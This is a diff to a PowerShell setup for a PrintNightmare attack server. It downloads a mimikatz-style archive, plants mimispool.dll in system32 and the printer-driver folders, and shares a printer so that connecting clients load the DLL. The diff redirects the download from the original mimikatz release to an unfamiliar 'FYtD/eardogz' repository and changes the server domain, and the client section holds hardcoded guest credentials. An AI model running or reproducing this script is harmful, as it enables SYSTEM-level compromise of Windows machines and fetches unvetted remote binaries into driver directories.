@@ -9,12 +9,12 @@ $system32        = $env:systemroot + '\system32'
 $drivers         = $system32 + '\spool\drivers'
 $RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
 
-Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip' -OutFile '.\mimikatz_trunk.zip'
-Expand-Archive -Path '.\mimikatz_trunk.zip' -DestinationPath '.\mimikatz_trunk'
+Invoke-WebRequest -Uri 'https://github.com/FYtD/eardogz/releases/latest/download/eardogz_trunk.zip' -OutFile '.\eardogz_trunk.zip'
+Expand-Archive -Path '.\eardogz_trunk.zip' -DestinationPath '.\eardogz_trunk'
 
 Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
-Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
-Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
+Copy-Item -Force -Path '.\eardogz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
+Copy-Item -Force -Path '.\eardogz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
 
 Add-PrinterDriver -Name       'Generic / Text Only'
 Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared
@@ -56,9 +56,9 @@ Remove-Item -Force -Path ($system32 + '\mimispool.dll')
 
 ### Client
 
-#### Any computer with explicit credential to `printnightmare.gentilkiwi.com`
+#### Any computer with explicit credential to `printnightmare.FYtD.com`
 ```
-$serverName  = 'printnightmare.gentilkiwi.com'
+$serverName  = 'printnightmare.FYtD.com'
 $username    = 'gentilguest'
 $password    = 'password'
 $printerName = 'Kiwi Legit Printer'
